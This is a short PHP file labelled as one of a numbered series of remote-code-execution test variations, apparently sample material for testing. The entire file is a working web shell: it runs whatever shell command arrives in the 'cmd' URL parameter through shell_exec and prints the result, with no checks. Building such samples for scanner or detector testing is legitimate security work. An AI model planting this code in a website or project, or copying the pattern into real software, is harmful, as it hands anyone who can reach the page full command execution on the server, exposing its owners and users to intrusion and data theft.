<?php
// RCE test variation #981
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>